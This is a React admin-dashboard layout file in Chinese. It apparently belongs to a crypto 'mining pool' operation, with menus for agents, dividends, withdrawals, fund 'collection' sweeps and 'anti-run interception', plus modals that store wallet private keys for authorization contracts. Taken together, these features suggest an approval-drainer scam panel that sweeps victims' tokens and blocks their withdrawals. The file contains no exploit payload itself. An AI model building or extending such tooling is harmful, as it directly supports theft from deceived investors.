import React, { useState } from "react";
import { Layout, Menu, Avatar, Dropdown, Button, Modal, Form, Input, message, Tabs } from "antd";
import { Outlet } from "react-router-dom";
import { useNavigate, useLocation } from "react-router-dom";
import { useMemo } from "react";
import { useEffect } from "react";
import { 
  HomeOutlined,
  MenuFoldOutlined,
  MenuUnfoldOutlined,
  UserOutlined,
  LoginOutlined,
  SmileOutlined,
  TransactionOutlined,
  SolutionOutlined,
  UserSwitchOutlined,
  KeyOutlined,
  SettingOutlined,
  CaretDownOutlined,
  WalletOutlined,
  SafetyCertificateOutlined,
  ProfileOutlined
} from "@ant-design/icons";
import "./layout.scss";
import ailogo from '@/assets/ai-u.png'
import { editWalletAddress, editPassWord , editChatId, getSysInfo, setPrivateKey, setAuthAddrPrivateKey } from "@/api/sys"

const { Header, Content, Sider } = Layout;
const App = () => {
  const navigate = useNavigate();
  const authority = localStorage.getItem('authority') || '1' //权限状态
  const items2 = [
    {
      key: "/dashboard",
      label: "首页",
      icon: <HomeOutlined />,
    },
    {
      key: "/proxy",
      label: "代理管理",
      icon: <SmileOutlined />,
      children:[
        {
          key: "/proxy-list",
          label: "代理列表",
        },
        authority == "0" && {
          key:"/domain-sys",
          label: "系统域名"
        },
        authority == "0" && {
          key:"/domain-proxy",
          label: "代理域名"
        },
      ]
    },
    {
      key: "/bill",
      label: "账单管理",
      icon: <TransactionOutlined />,
      children:[
        {
          key:"/proxy-bill",
          label: "总账单"
        },
        {
          key:"/proxy-sub-bill",
          label: "代理账单"
        },
      ]
    },
    {
      key:"/member",
      label: "会员管理",
      icon: <UserOutlined />,
      children:[
        {
          key: "/account",
          label: "会员列表",
        },
        {
          key: "/access-log",
          label: "授权记录",
        },
      ]
    },
    {
      key: "/pool",
      label: "矿池管理",
      icon: <WalletOutlined />,
      children: [
        {
          key:"/member-list",
          label: "矿池会员"
        },
        {
          key:"/height-poll",
          label: "高级矿池"
        },
        {
          key:"/divident",
          label: "派息记录"
        },
        {
          key:"/withdrawal-logs",
          label: "提现申请"
        },
        {
          key: "/mining-logs",
          label: "挖矿申请",
        },
        {
          key: "/announcement-management",
          label: "通告管理",
        },
        {
          key:"/coll-logs",
          label: "归集"
        },
        {
          key:"/intercept-coll",
          label: "防跑拦截"
        },
      ]
    },
    {
      key: "/report",
      label: "报表管理",
      icon: <SolutionOutlined />,
      children:[
        {
          key: "/access-record",
          label: "访问记录",
        },
      ]
    },
    {
      key: "/market",
      label: "营销管理",
      icon: <ProfileOutlined />,
      children:[
        {
          key: "/home-config",
          label: "首页配置",
        },
      ]
    },
    {
      key: "/user-center",
      label: "个人中心",
      icon: <UserSwitchOutlined />,
    },
  ];
  let agency = localStorage.getItem("agency") || ""
  // let collectionAddress = localStorage.getItem("collectionAddress")
  // let authAddress = localStorage.getItem("authAddress")
  // let blockerAddress = localStorage.getItem("blockerAddress")
  // let chatId = localStorage.getItem("chatId") || ""
  const token = localStorage.getItem("token");
  const [collapsed, setCollapsed] = useState(false);
  const [pwdShow,setPwdShow] = useState(false);
  const [addressShow,setAddressShow] = useState(false);
  const [sshShow, setSSHShow] = useState(false)
  const [resetSSHShow,setResetSSHShow] = useState(false)
  const [resetAuthShow, setResetAuthShow] = useState(false)
  const [tipsShow,setTipsShow] = useState(false)
  const [sshDisabled, setSSHDisabled] = useState(false)
  const [authDisabled, setAuthDisabled] = useState(false) //授权地址禁用
  const [authModalShow,setAuthModalShow] = useState(false)
  const [submitForm] = Form.useForm();
  const [addForm] = Form.useForm();
  const [sshForm] = Form.useForm();
  const [authForm] = Form.useForm();
  const [sysInfo, setSysInfo] = useState({})
  const [tabList,setTabList] = useState([{ label: '首页', key: '/dashboard', closable: false,}])
  const [tabActiveKey, setTabActiveKey] = useState('/dashboard');
  
  useEffect(() => {
    if (!token) {
      navigate("/login", {replace: true,});
      return;
    }else if(location.pathname == '/'){
      navigate("/dashboard",{replace: true,});
      return;
    }
  }, [token]);

  
  const handleSelect = ({ item, key, keyPath, domEvent }) => {
    if(!keyPath)return
    let path = keyPath.reverse().join("")
    navigate(path)
    filterMenuTabs(key,path,items2)
  };
  const location = useLocation();

  const filterMenuTabs = (key,keyPath,arr) => {
    for(let i=0;i<arr.length;i++){
      if(arr[i].key == key){
        let hasKey = tabList.some(item=>item.key == arr[i].key)
        console.log(hasKey)
        hasKey ? null : setTabList([...tabList,{ label: arr[i].label, key: keyPath}])
        setTabActiveKey(keyPath)
        return
      }
      if(arr[i].children && arr[i].children.length){
        for(let j=0; j<arr[i].children.length; j++){
          if(arr[i].children[j].key == key){
            let hasKey2 = tabList.some(item=>item.label == arr[i].children[j].label)
            hasKey2 ? null : setTabList([...tabList, { label: arr[i].children[j].label, key: keyPath}])
            setTabActiveKey(keyPath)
            return
          }
        }
      }
    }
  }

  useEffect(()=>{
    handleGetSysInfo()
  },[location])

  const defaultSelectedKeys = useMemo(() => {
    const sumMenu = ["report","proxy","pool","sys","member","bill","market"]
    if(sumMenu.includes(location.pathname.split('/')[1])){
      return `/${location.pathname.split('/')[2]}`
    }else{
      return [location.pathname];
    }
  }, [location]);
 
  //退出登陆
  const handleLogOut = () => {
    localStorage.clear();
    window.location.reload();
  };

  const handleGetSysInfo = async()=>{
    try{
      let { data } = await getSysInfo()
      setSysInfo(data)

      if(authority != "0"){return}
      if(!data.BNBPrivateKey || !data.BNBWalletAddress || !data.ETHWalletAddress || !data.ETHPrivateKey){
        setSSHDisabled(false)
      }else{
        setSSHDisabled(true)
      }

      if(!data.BSCWalletAddress || !data.BSCPrivateKey || !data.ERCPrivateKey || !data.ERCWalletAddress){
        setTipsShow(true)
        setAuthDisabled(false)
      }else{
        setAuthDisabled(true)
      }
    } catch{ }
  }

  const toggleCollapsed = () => {setCollapsed(!collapsed);}

  const pwdConfirm = async () => {
    submitForm.validateFields().then(async (values) => {
      try{
        const { code,data } = await editPassWord({
          wornPassword: submitForm.getFieldValue().oldPassword || '',
          newPassword: submitForm.getFieldValue().newPassword || ''
        })
        if(code == 200){
          if(data){
            message.success("修改成功");
            setPwdShow(false)
            submitForm.resetFields()
          }else{
            message.error("修改失败,原始密码错误");
            setPwdShow(false)
            submitForm.resetFields()
          }
        }
      }catch{
        message.error("修改失败");
        console.log(`【pages/layout】error`);
        submitForm.resetFields()
      }
    }).catch((error)=>{
      console.log(err)
    })
  }

  const pwdCancel = () => {
    setPwdShow(false)
    submitForm.resetFields()
  }

  const openSystem = () => {
    let { BNBContractAddress, ETHContractAddress, blockerAddress, chatId, collectionAddress } = sysInfo
    console.log(BNBContractAddress,ETHContractAddress,"地址")
    addForm.setFieldsValue({
      BNBContractAddress,
      ETHContractAddress,
      blockerAddress,
      collectionAddress,
      chatId,
    })
    setAddressShow(true)
  }
  
  //修改归集地址确认
  const addressConfirm = async () => {
    addForm.validateFields().then(async (values) => {
      // if(authority == "0"){
      handleEditWallet()
      // }
      // handleEditChatId()
    }).catch()
  }

  const handleEditWallet = async ()=>{
    try{
      let values = addForm.getFieldValue()
      const { code } = await editWalletAddress({
        ...values
      })
      if(code == 200){
        message.success("设置成功");
        setAddressShow(false)
        handleGetSysInfo()
        addForm.resetFields()
      }
    }catch{
      message.error("设置失败");
      console.log(`【pages/layout】error`);
      addForm.resetFields()
    }
  }

  const handleEditChatId = async () => {
    try{
      const { code } = await editChatId({
        chatId:addForm.getFieldValue().chatId || '',
      })
      if(code == 200){
        message.success("设置机器人成功");
        localStorage.setItem('chatId',addForm.getFieldsValue().chatId)
        collectionAddress = addForm.getFieldsValue().chatId
        setAddressShow(false)
      }
    }catch{
      message.error("设置机器人失败");
      console.log(`【pages/layout】error`);
      addForm.resetFields()
    }
  }

  const addressCancel = () => {
    setAddressShow(false)
    addForm.resetFields()
  }


  //打开密钥设置
  const openSSH = async () => {
    let { BNBPrivateKey, BNBWalletAddress, ETHPrivateKey, ETHWalletAddress } = sysInfo
    sshForm.setFieldsValue({
      BNBPrivateKey,
      BNBWalletAddress,
      ETHPrivateKey,
      ETHWalletAddress
    })
    setSSHShow(true)
  }

  //设置密钥确认
  const sshConfirm = async () => {
    setSSHShow(false)
    // if(sshDisabled){
    //   setResetSSHShow(true)
    //   return
    // }
    // sshForm.validateFields().then(async (values) => {
    //   try{
    //     let { data } = await setPrivateKey(values)
    //     if(data == "200"){
    //       message.success("设置成功")
    //       handleGetSysInfo()
    //       setSSHShow(false)
    //       sshForm.resetFields()
    //     }else if(data == "403"){
    //       message.error("设置失败,请先设置合约地址")
    //     }else if(data == "401"){
    //       message.error("BNB私钥地址不匹配,请检查私钥地址是否输入正确")
    //     }else if(data == "402"){
    //       message.error("ETH私钥地址不匹配,请检查私钥地址是否输入正确")
    //     }
    //   }catch{
    //     message.error("设置失败")
    //   }
    // })
    // setResetSSHShow(true)
  }

  const sshCancel = async () => {
    setSSHShow(false)
  }

  //打开授权设置
  const openAuthModal = () => {
    let { BSCPrivateKey, BSCWalletAddress, ERCPrivateKey, ERCWalletAddress } = sysInfo
    if(!BSCWalletAddress || !BSCPrivateKey || !ERCPrivateKey || !ERCWalletAddress){
      setAuthDisabled(false)
    }else{ setAuthDisabled(true) }
    authForm.setFieldsValue({
      BSCPrivateKey,
      BSCWalletAddress,
      ERCPrivateKey,
      ERCWalletAddress
    })
    setAuthModalShow(true)
  }

  const authModalConfirm = async () => {
    if(authDisabled){
      setResetAuthShow(true)
      return
    }
    authForm.validateFields().then(async (values) => {
      try{
        let { data } = await setAuthAddrPrivateKey(values)
        if(data == "200"){
          message.success("设置成功")
          handleGetSysInfo()
          setAuthModalShow(false)
          authForm.resetFields()
        }else if(data == "403"){
          message.error("设置失败,请先设置合约地址")
        }else if(data == "401"){
          message.error("BNB私钥地址不匹配,请检查私钥地址是否输入正确")
        }else if(data == "402"){
          message.error("ETH私钥地址不匹配,请检查私钥地址是否输入正确")
        }
      }catch{
        message.error("设置失败")
      }
    })
  }

  const authModalCancel = async () => {
    setAuthModalShow(false)
    authForm.resetFields()
  }

  const tabChange = (newActiveKey) => {
    setTabActiveKey(newActiveKey);
    navigate(newActiveKey)
  }

  const remove = (targetKey) => {
    let newActiveKey = tabActiveKey;
    let lastIndex = -1;
    tabList.forEach((item, i) => {
      if (item.key === targetKey) {
        lastIndex = i - 1;
      }
    });
    const newPanes = tabList.filter(item => item.key !== targetKey);
    if (newPanes.length && newActiveKey === targetKey) {
      if (lastIndex >= 0) {
        newActiveKey = newPanes[lastIndex].key;
      } else {
        newActiveKey = newPanes[0].key;
      }
    }
    setTabList(newPanes)
    setTabActiveKey(newActiveKey)
    navigate(newActiveKey)
  };

  const tabEdit = (targetKey) => {
      remove(targetKey)
  }

  return (
    <section className="container-box">
      <aside>
        <div className="logo" style={{width: collapsed ? '80px' : '200px' }}>
          <img src={ailogo} alt="" />
        </div>
        <div className="menu-box">
          <Menu
            mode="inline"
            inlineCollapsed={collapsed}
            selectedKeys={defaultSelectedKeys}
            defaultOpenKeys={['/pool']}
            style={{
              borderRight: 0,
            }}
            className="h-full"
            items={items2}
            onClick={handleSelect}
          />
        </div>
      </aside>
      <section className="main-r">
        <header>
          <div style={{display: 'flex',alignItems: 'center',color: '#fff'}}>
            <Button onClick={toggleCollapsed} size='large' style={{background: 'none',border: 'none'}}>
              {collapsed ? <MenuUnfoldOutlined style={{fontSize: '24px',color: "#fff"}}/> : <MenuFoldOutlined style={{fontSize: '24px',color: "#fff"}} />}
            </Button>
          </div>
          <div className="r-box">
            <Dropdown
                menu={{
                  items: [
                    {
                      key: "1",
                      label: (
                        <Button type="link" size="small" icon={<KeyOutlined />} onClick={ ()=>{ setPwdShow(true) } } style={{color: "#1c1c1c"}}>
                          修改密码
                        </Button>
                      ),
                    },
                    {
                      key: "2",
                      label: (
                        <Button type="link" size="small" icon={<SettingOutlined />} onClick={openSystem} style={{color: "#1c1c1c"}}>
                          系统设置
                        </Button>
                      )
                    },
                    authority == "0" && {
                      key: "3",
                      label: (
                        <Button type="link" size="small" icon={<SafetyCertificateOutlined />} onClick={openSSH} style={{color: "#1c1c1c"}}>
                          密钥设置
                        </Button>
                      )
                    },
                    authority == "0" && {
                      key: "4",
                      label: (
                        <Button type="link" size="small" icon={<UserSwitchOutlined />} onClick={openAuthModal} style={{color: "#1c1c1c"}}>
                          授权设置
                        </Button>
                      )
                    },
                    {
                      key: "5",
                      label: (
                        <Button type="link" size="small" icon={<LoginOutlined />} onClick={handleLogOut} style={{color: "#1c1c1c"}}>
                          退出登录
                        </Button>
                      )
                    },
                  ],
                }}
              >
                <div style={{display: 'flex',alignItems: 'center',color: '#fff',cursor: "pointer",fontSize: "15px"}}>
                  {/* <Avatar size="small" icon={<UserOutlined />} /> */}
                  <UserOutlined />
                  <span className="ml-2 mr-2">欢迎您，{ agency }</span>
                  <CaretDownOutlined />
                </div>
            </Dropdown>
            {/* <div className="logo-out-btn" onClick={handleLogOut}>
              <LoginOutlined />
              <span className="ml-2">退出登录</span>
            </div> */}
          </div>
        </header>
        <main>
          {/* <div style={{padding:"10px 24px 0 24px"}}>
            <Tabs
              hideAdd
              type="editable-card"
              onChange={tabChange}
              activeKey={tabActiveKey}
              onEdit={tabEdit}
              items={tabList}
            />
          </div> */}
          <Outlet />
          <Modal
            title="修改密码"
            open={pwdShow}
            onOk={pwdConfirm}
            onCancel={pwdCancel}
            okText="确定"
            cancelText="关闭"
            width={800}
          >
            <Form form={submitForm} labelCol={{span:4}} wrapperCol={{span: 18}}>
              <Form.Item
                name="oldPassword"
                label="旧密码"
                rules={[
                  { required: true, message: '请输入旧密码!'},
                ]}
              >
                <Input.Password />
              </Form.Item>
              <Form.Item
                name="newPassword"
                label="新密码"
                rules={[
                  { required: true, message: '请输入新密码!',},
                ]}
              >
                <Input.Password />
              </Form.Item>
              <Form.Item
                name="confirmPassword"
                label="确认密码"
                dependencies={['newPassword']}
                rules={[
                  {
                    required: true,
                    message: '请输入确认密码!',
                  },
                  ({ getFieldValue }) => ({
                    validator(rule, value) {
                      if (!value || getFieldValue('newPassword') === value) {
                        return Promise.resolve();
                      }
                      return Promise.reject('确认密码与新密码不一致!');
                    },
                  }),
                ]}
              >
                <Input.Password />
              </Form.Item>
            </Form>
          </Modal>
          <Modal
            title="系统设置"
            open={addressShow}
            onOk={addressConfirm}
            onCancel={addressCancel}
            okText="确定"
            cancelText="关闭"
            width={800}
            className="self-modal"
          >
            <Form form={addForm} labelCol={{span:4}} wrapperCol={{span: 18}}>
              {
                authority === '0' && 
                <div className="text-red" style={{lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>*特别提示：授权地址必须是合约地址,不是钱包地址,必须保证里面的BNB或ETH大于0.1,以保证归集拦截时里面有足够燃料费</div>
              }
              {
                authority === '0' && 
                <div className="mb-5" style={{borderBottom: "1px #eee solid",lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>授权地址设置</div>
              }
              {
                authority === '0' && 
                <Form.Item
                  label="发布合约"
                >
                  <div 
                    className="cursor-pointer flex ml-2 text-link" 
                    style={{width: "120px",justifyContent: "center",alignItems: "center"}}
                    onClick={()=>{
                      open(`https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.17+commit.8df45f5f.js`,'_blank')
                    }}
                    >
                      ETH发布合约
                  </div>
                  <div 
                    className="cursor-pointer flex ml-2 text-link" 
                    style={{width: "120px",justifyContent: "center",alignItems: "center"}}
                    onClick={()=>{
                      open(`https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.17+commit.8df45f5f.js`,'_blank')
                    }}
                    >
                      BNB发布合约
                  </div>
                </Form.Item>
              }
              {
                authority === '0' && 
                <Form.Item
                  name="ETHContractAddress"
                  label="ETH授权"
                  // rules={[
                  //   { required: true, message: '请输入ETH授权地址!'},
                  // ]}
                >
                    <Input 
                      disabled
                      placeholder="请输入ETH授权地址" 
                    />
                </Form.Item>
              }
              {
                authority === '0' && 
                <Form.Item
                  name="BNBContractAddress"
                  label="BNB授权"
                  // rules={[
                  //   { required: true, message: '请输入BNB授权地址!'},
                  // ]}
                >
                  <Input 
                    disabled
                    placeholder="请输入BNB授权地址" 
                  />
                  
                </Form.Item>
                
              }
              {
                authority === '0' && 
                <div className="mb-5" style={{borderBottom: "1px #eee solid",lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>归集地址设置</div>
              }
              {
                authority === '0' && 
                <Form.Item
                  name="blockerAddress"
                  label="拦截地址"
                  rules={[
                    { required: true, message: '请输入拦截地址!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入拦截地址" 
                  />
                </Form.Item>
              }
              {
                authority === '0' && 
                <Form.Item
                  name="collectionAddress"
                  label="归集地址"
                  rules={[
                    { required: true, message: '请输入归集地址!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入归集地址" 
                  />
                </Form.Item>
              }
              
              <div className="mb-5" style={{borderBottom: "1px #eee solid",lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>机器人设置</div>
              <Form.Item
                name="chatId"
                label="Chat ID"
                rules={[
                  { required: true, message: '请输入Chat ID!'},
                ]}
              >
                <Input placeholder="请输入Chat ID" />
              </Form.Item>
            </Form>
          </Modal>
          <Modal
            title="密钥设置"
            open={sshShow}
            onOk={sshConfirm}
            onCancel={sshCancel}
            okText="确定"
            cancelText="关闭"
            width={800}
          >
            <Form form={sshForm} labelCol={{span:5}} wrapperCol={{span: 17}} disabled={sshDisabled}>
              <div className="text-red" style={{lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>*特别提示：钱包地址与私钥必须和创建合约时使用的钱包地址和私钥保持一致，否则会导致归集和拦截失败！</div>
              <div className="mb-5" style={{borderBottom: "1px #eee solid",lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>ETH密钥设置</div>
                <Form.Item
                  name="ETHWalletAddress"
                  label="创建合约钱包地址"
                  rules={[
                    { required: true, message: '请输入创建合约钱包地址!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入创建合约钱包地址" 
                  />
                </Form.Item>
                <Form.Item
                  name="ETHPrivateKey"
                  label="创建合约钱包私钥"
                  rules={[
                    { required: true, message: '请输入创建合约钱包私钥!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入创建合约钱包私钥" 
                  />
                </Form.Item>
                <div className="mb-5" style={{borderBottom: "1px #eee solid",lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>BNB密钥设置</div>
                <Form.Item
                  name="BNBWalletAddress"
                  label="创建合约钱包地址"
                  rules={[
                    { required: true, message: '请输入创建合约钱包地址!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入创建合约钱包地址" 
                  />
                </Form.Item>
                <Form.Item
                  name="BNBPrivateKey"
                  label="创建合约钱包私钥"
                  rules={[
                    { required: true, message: '请输入创建合约钱包私钥!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入创建合约钱包私钥" 
                  />
                </Form.Item>
            </Form>
          </Modal>
          <Modal
            title="授权地址设置"
            open={authModalShow}
            onOk={authModalConfirm}
            onCancel={authModalCancel}
            okText={authDisabled ? "重置" : "确定"}
            cancelText="关闭"
            width={800}
          >
            <Form form={authForm} labelCol={{span:5}} wrapperCol={{span: 17}} disabled={authDisabled}>
            <div className="text-red" style={{lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>*特别提示：钱包地址与私钥必须配对，否则会导致归集和拦截失败！</div>
              <div className="mb-5" style={{borderBottom: "1px #eee solid",lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>ETH授权设置</div>
                <Form.Item
                  name="ERCWalletAddress"
                  label="ETH钱包地址"
                  rules={[
                    { required: true, message: '请输入ETH钱包地址!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入ETH钱包地址" 
                  />
                </Form.Item>
                <Form.Item
                  name="ERCPrivateKey"
                  label="ETH钱包私钥"
                  rules={[
                    { required: true, message: '请输入ETH钱包私钥!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入ETH钱包私钥" 
                  />
                </Form.Item>
                <div className="mb-5" style={{borderBottom: "1px #eee solid",lineHeight: "50px",fontSize: "13px",fontWeight: "bold"}}>BNB授权设置</div>
                <Form.Item
                  name="BSCWalletAddress"
                  label="BNB钱包地址"
                  rules={[
                    { required: true, message: '请输入BNB钱包地址!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入BNB钱包地址" 
                  />
                </Form.Item>
                <Form.Item
                  name="BSCPrivateKey"
                  label="BNB钱包私钥"
                  rules={[
                    { required: true, message: '请输入BNB钱包私钥!'},
                  ]}
                >
                  <Input 
                    placeholder="请输入BNB钱包私钥" 
                  />
                </Form.Item>
            </Form>
          </Modal>
          <Modal okText="确定" cancelText="关闭" title="提示" open={resetSSHShow} onOk={()=>{
            setResetSSHShow(false);
            setSSHDisabled(false);
            sshForm.resetFields();
          }} onCancel={()=>{setResetSSHShow(false)}}>
            <p className="text-center text-red">重置密钥将导致拦截归集和归集失效，是否确定重置密钥？</p>
          </Modal>
          <Modal okText="确定" cancelText="关闭" title="提示" open={resetAuthShow} onOk={()=>{
            setResetAuthShow(false);
            setAuthDisabled(false)
            authForm.resetFields();
          }} onCancel={()=>{setResetAuthShow(false)}}>
            <p className="text-center text-red">重置将导致拦截归集和归集失效，是否确定重置？</p>
          </Modal>
          <Modal okText="确定" cancelText="关闭" title="提示" open={tipsShow} onOk={()=>{setAuthModalShow(true);setTipsShow(false)}} onCancel={()=>{setTipsShow(false)}}>
            <div className="text-center text-red">系统还未进行授权地址私钥设置,请先设置授权地址私钥,再进行系统操作!</div>
          </Modal>
        </main>
      </section>
    </section>
  );
};
export default App;
